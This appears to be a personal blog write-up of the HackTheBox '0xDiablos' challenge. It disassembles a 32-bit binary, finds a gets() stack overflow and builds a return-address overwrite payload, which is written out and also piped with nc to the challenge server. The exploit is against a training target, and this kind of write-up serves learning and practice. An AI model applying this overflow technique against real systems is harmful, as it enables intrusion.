---
title: "0xdiablos"
date: 2022-09-20T14:03:31+01:00
draft: false
categories:
  - HackTheBox
---

First challenge on this platform!

No nmap scan or gobuster...I just had to download the [vuln](https://github.com/nair0lf32/CTF-Scripts/blob/master/Hackthebox/oxdiablos/vuln) script in zip archive with a given password (hackthebox)

After unzipping and executing it, the program just takes an input and echo it back in the console...

Seems like its about reverse engineering and buffer overflow

I dont know reverse engineering tools alot so googling gave us `radare2`

Installed radare2

Tried to input long character strings we get a segmentation fault

We use python to find how many characters break

```
└──╼ $python -c 'print( "x" _ 183)' | ./vuln
You know who are 0xDiablos:
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

└──╼ $python -c 'print( "x" _ 184)' | ./vuln
You know who are 0xDiablos:
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
Erreur de segmentation
```

we analyse the file

```
file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=ab7f19bb67c16ae453d4959fba4e6841d930a6dd, for GNU/Linux 3.2.0, not stripped

checksec vuln
[*] '/home/nair0lf32/Desktop/Stuff/HTB/challenges/0xDiablos/vuln'
Arch: i386-32-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX disabled
PIE: No PIE (0x8048000)
RWX: Has RWX segments

gdb vuln
GNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git
Copyright (C) 2021 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.

...

Non-debugging symbols:
0x08049000 \_init
0x08049030 printf@plt
0x08049040 gets@plt
0x08049050 fgets@plt
0x08049060 getegid@plt
0x08049070 puts@plt
0x08049080 exit@plt
0x08049090 **libc_start_main@plt
0x080490a0 setvbuf@plt
0x080490b0 fopen@plt
0x080490c0 setresgid@plt
0x080490d0 \_start
0x08049110 \_dl_relocate_static_pie
0x08049120 **x86.get_pc_thunk.bx
0x08049130 deregister_tm_clones
0x08049170 register_tm_clones
0x080491b0 **do_global_dtors_aux
0x080491e0 frame_dummy
0x080491e2 flag
0x08049272 vuln
0x080492b1 main
0x08049330 **libc_csu_init
0x08049390 **libc_csu_fini
0x08049391 **x86.get_pc_thunk.bp
0x08049398 \_fini

(gdb) disassemble main
Dump of assembler code for function main:
0x080492b1 <+0>: lea 0x4(%esp),%ecx
0x080492b5 <+4>: and $0xfffffff0,%esp
0x080492b8 <+7>: push -0x4(%ecx)
0x080492bb <+10>: push %ebp
0x080492bc <+11>: mov %esp,%ebp
0x080492be <+13>: push %ebx
0x080492bf <+14>: push %ecx
0x080492c0 <+15>: sub $0x10,%esp
0x080492c3 <+18>: call 0x8049120 <\_\_x86.get_pc_thunk.bx>
0x080492c8 <+23>: add $0x2d38,%ebx
0x080492ce <+29>: mov -0x4(%ebx),%eax
0x080492d4 <+35>: mov (%eax),%eax
0x080492d6 <+37>: push $0x0
0x080492d8 <+39>: push $0x2
0x080492da <+41>: push $0x0
0x080492dc <+43>: push %eax
0x080492dd <+44>: call 0x80490a0 <setvbuf@plt>
0x080492e2 <+49>: add $0x10,%esp
0x080492e5 <+52>: call 0x8049060 <getegid@plt>
0x080492ea <+57>: mov %eax,-0xc(%ebp)
0x080492ed <+60>: sub $0x4,%esp
0x080492f0 <+63>: push -0xc(%ebp)
0x080492f3 <+66>: push -0xc(%ebp)
0x080492f6 <+69>: push -0xc(%ebp)
0x080492f9 <+72>: call 0x80490c0 <setresgid@plt>
0x080492fe <+77>: add $0x10,%esp
0x08049301 <+80>: sub $0xc,%esp
0x08049304 <+83>: lea -0x1fc8(%ebx),%eax
0x0804930a <+89>: push %eax
0x0804930b <+90>: call 0x8049070 <puts@plt>
0x08049310 <+95>: add $0x10,%esp
0x08049313 <+98>: call 0x8049272 <vuln>
0x08049318 <+103>: mov $0x0,%eax
0x0804931d <+108>: lea -0x8(%ebp),%esp
0x08049320 <+111>: pop %ecx
0x08049321 <+112>: pop %ebx
0x08049322 <+113>: pop %ebp
0x08049323 <+114>: lea -0x4(%ecx),%esp
0x08049326 <+117>: ret
End of assembler dump.
```

Main function seems not to be vulnerable but calls vuln function...we disassemble vuln too and notice a gets() usage which can be vulnerable to BOF

There is a nice tool called `PEDA (gdb-peda)` that facilitate RE

Or use `Cutter` for code analysis alternatively to r2

Now back to radare2

```
r2 vuln

aaaa //analyze
afl //to analyze functions

0x080490d0 1 50 entry0
0x08049103 1 4 fcn.08049103
0x08049090 1 6 sym.imp.**libc_start_main
0x08049130 4 49 -> 40 sym.deregister_tm_clones
0x08049170 4 57 -> 53 sym.register_tm_clones
0x080491b0 3 33 -> 30 sym.**do_global_dtors_aux
0x080491e0 1 2 entry.init0
0x08049390 1 1 sym.**libc_csu_fini
0x08049120 1 4 sym.**x86.get_pc_thunk.bx
0x08049391 1 4 sym.**x86.get_pc_thunk.bp
0x08049272 1 63 sym.vuln
0x08049040 1 6 sym.imp.gets
0x08049070 1 6 sym.imp.puts
0x08049398 1 20 sym.\_fini
0x08049330 4 93 sym.**libc_csu_init
0x08049110 1 1 sym.\_dl_relocate_static_pie
0x080492b1 1 118 main
0x080490a0 1 6 sym.imp.setvbuf
0x08049060 1 6 sym.imp.getegid
0x080490c0 1 6 sym.imp.setresgid
0x080491e2 8 144 sym.flag
0x080490b0 1 6 sym.imp.fopen
0x08049080 1 6 sym.imp.exit
0x08049050 1 6 sym.imp.fgets
0x08049030 1 6 sym.imp.printf
0x08049000 3 32 sym.\_init
```

we see the script has 3 functions vuln, main and flag...main calls vuln which uses gets

we can overflow that function

```
[0x080490d0]> pdf //show the funtions
;-- section..text:
;-- .text:
;-- \_start:
;-- eip:
┌ 50: entry0 ();
│ 0x080490d0 31ed xor ebp, ebp ; [13] -r-x section size 709 named .text
│ 0x080490d2 5e pop esi
│ 0x080490d3 89e1 mov ecx, esp
│ 0x080490d5 83e4f0 and esp, 0xfffffff0
│ 0x080490d8 50 push eax
│ 0x080490d9 54 push esp
│ 0x080490da 52 push edx
│ 0x080490db e823000000 call fcn.08049103
│ 0x080490e0 81c3202f0000 add ebx, 0x2f20
│ 0x080490e6 8d8390d3ffff lea eax, [ebx - 0x2c70]
│ 0x080490ec 50 push eax ; func fini
│ 0x080490ed 8d8330d3ffff lea eax, [ebx - 0x2cd0]
│ 0x080490f3 50 push eax ; func init
│ 0x080490f4 51 push ecx ; char **ubp_av
│ 0x080490f5 56 push esi ; int argc
│ 0x080490f6 c7c0b1920408 mov eax, main ; 0x80492b1
│ 0x080490fc 50 push eax ; 0x80492b1
│ ; sym.main ; func main
└ 0x080490fd e88effffff call sym.imp.**libc_start_main ; int **libc_start_main(func main, int argc, char **ubp_av, func init, func fini, func rtld_fini, void \*stack_end)

...

[0x080490d0]> s sym.vuln //select address of the function

[0x08049272]> pdf
; CALL XREF from main @ 0x8049313
┌ 63: sym.vuln ();
│ ; var char *s @ ebp-0xb8
│ ; var int32_t var_4h @ ebp-0x4
│ 0x08049272 55 push ebp
│ 0x08049273 89e5 mov ebp, esp
│ 0x08049275 53 push ebx
│ 0x08049276 81ecb4000000 sub esp, 0xb4
│ 0x0804927c e89ffeffff call sym.\_\_x86.get_pc_thunk.bx
│ 0x08049281 81c37f2d0000 add ebx, 0x2d7f
│ 0x08049287 83ec0c sub esp, 0xc
│ 0x0804928a 8d8548ffffff lea eax, [s]
│ 0x08049290 50 push eax ; char *s
│ 0x08049291 e8aafdffff call sym.imp.gets ; char *gets(char *s)
│ 0x08049296 83c410 add esp, 0x10
│ 0x08049299 83ec0c sub esp, 0xc
│ 0x0804929c 8d8548ffffff lea eax, [s]
│ 0x080492a2 50 push eax ; const char *s
│ 0x080492a3 e8c8fdffff call sym.imp.puts ; int puts(const char *s)
│ 0x080492a8 83c410 add esp, 0x10
│ 0x080492ab 90 nop
│ 0x080492ac 8b5dfc mov ebx, dword [var_4h]
│ 0x080492af c9 leave
└ 0x080492b0 c3 ret

//We are at address value from vuln that is 0x08049272
```

Now for flag function

```
0x08049272]> s sym.flag
[0x080491e2]> pdf
┌ 144: sym.flag (uint32_t arg_8h, uint32_t arg_ch);
│ ; var char *format @ ebp-0x4c
│ ; var file*stream @ ebp-0xc
│ ; var int32_t var_4h @ ebp-0x4
│ ; arg uint32_t arg_8h @ ebp+0x8
│ ; arg uint32_t arg_ch @ ebp+0xc
│ 0x080491e2 55 push ebp
│ 0x080491e3 89e5 mov ebp, esp
│ 0x080491e5 53 push ebx
│ 0x080491e6 83ec54 sub esp, 0x54
│ 0x080491e9 e832ffffff call sym.\_\_x86.get_pc_thunk.bx
│ 0x080491ee 81c3122e0000 add ebx, 0x2e12
│ 0x080491f4 83ec08 sub esp, 8
│ 0x080491f7 8d8308e0ffff lea eax, [ebx - 0x1ff8]
│ 0x080491fd 50 push eax ; const char *mode
│ 0x080491fe 8d830ae0ffff lea eax, [ebx - 0x1ff6]
│ 0x08049204 50 push eax ; const char *filename
│ 0x08049205 e8a6feffff call sym.imp.fopen ; file*fopen(const char *filename, const char *mode)
│ 0x0804920a 83c410 add esp, 0x10
│ 0x0804920d 8945f4 mov dword [stream], eax
│ 0x08049210 837df400 cmp dword [stream], 0
│ ┌─< 0x08049214 751c jne 0x8049232
│ │ 0x08049216 83ec0c sub esp, 0xc
│ │ 0x08049219 8d8314e0ffff lea eax, [ebx - 0x1fec]
│ │ 0x0804921f 50 push eax ; const char *s
│ │ 0x08049220 e84bfeffff call sym.imp.puts ; int puts(const char *s)
│ │ 0x08049225 83c410 add esp, 0x10
│ │ 0x08049228 83ec0c sub esp, 0xc
│ │ 0x0804922b 6a00 push 0 ; int status
│ │ 0x0804922d e84efeffff call sym.imp.exit ; void exit(int status)
│ │ ; CODE XREF from sym.flag @ 0x8049214
│ └─> 0x08049232 83ec04 sub esp, 4
│ 0x08049235 ff75f4 push dword [stream] ; FILE *stream
│ 0x08049238 6a40 push 0x40 ; '@' ; 64 ; int size
│ 0x0804923a 8d45b4 lea eax, [format]
│ 0x0804923d 50 push eax ; char *s
│ 0x0804923e e80dfeffff call sym.imp.fgets ; char *fgets(char *s, int size, FILE *stream)
│ 0x08049243 83c410 add esp, 0x10
│ 0x08049246 817d08efbead. cmp dword [arg_8h], 0xdeadbeef
│ ┌─< 0x0804924d 751a jne 0x8049269
│ │ 0x0804924f 817d0c0dd0de. cmp dword [arg_ch], 0xc0ded00d
│ ┌──< 0x08049256 7514 jne 0x804926c
│ ││ 0x08049258 83ec0c sub esp, 0xc
│ ││ 0x0804925b 8d45b4 lea eax, [format]
│ ││ 0x0804925e 50 push eax ; const char *format
│ ││ 0x0804925f e8ccfdffff call sym.imp.printf ; int printf(const char *format)
│ ││ 0x08049264 83c410 add esp, 0x10
│ ┌───< 0x08049267 eb04 jmp 0x804926d
│ │││ ; CODE XREF from sym.flag @ 0x804924d
│ ││└─> 0x08049269 90 nop
│ ││┌─< 0x0804926a eb01 jmp 0x804926d
│ │││ ; CODE XREF from sym.flag @ 0x8049256
│ │└──> 0x0804926c 90 nop
│ │ │ ; CODE XREFS from sym.flag @ 0x8049267, 0x804926a
│ └─└─> 0x0804926d 8b5dfc mov ebx, dword [var_4h]
│ 0x08049270 c9 leave
└ 0x08049271 c3 ret
```

Address for flag function is 0x080491e2...lets convert it to hex format with p32 from python `pwntools`

```
from pwn import \*
p32(0x080491e2)
b'\xe2\x91\x04\x08'
```

Payload is now `python2 -c "print('A'\*188 + '\xe2\x91\x04\x08')" | ./vuln`

```
You know who are 0xDiablos:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
Hurry up and try in on server side.
```

we print A 188 times instead of 184 because we need to override the return value and past the base pointer (worth 4 bytes)

It didnt work yet on server...there are 2 arguments in said function we need to match

```
│ 0x08049246 817d08efbead. cmp dword [arg_8h], 0xdeadbeef
│ ┌─< 0x0804924d 751a jne 0x8049269
│ │ 0x0804924f 817d0c0dd0de. cmp dword [arg_ch], 0xc0ded00d
│ ┌──< 0x08049256 7514 jne 0x804926c
```

we convert 0xdeadbeef and 0xc0ded00d to hex format and add them to payload + 4 bytes of characters

Now the final paylaod is:

`python2 -c "print('A'*188 + '\xe2\x91\x04\x08'+'A'*4+'\xef\xbe\xad\xde\r\xd0\xde\xc0')" | ./vuln`

used an [exploit.py](https://github.com/nair0lf32/CTF-Scripts/blob/master/Hackthebox/oxdiablos/exploit.py) script for better comfort and usabilty

You can also use netcat directly

```
python2 -c "print('A'*188 + '\xe2\x91\x04\x08'+'A'*4+'\xef\xbe\xad\xde\r\xd0\xde\xc0')" | nc 138.68.131.63 31365
You know who are 0xDiablos:
���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAﾭ�
HTB{Ìnsert_flag_here}
```

How was that an easy challenge? Imagine the overall difficulty now...Go learn some assembly asap!!!
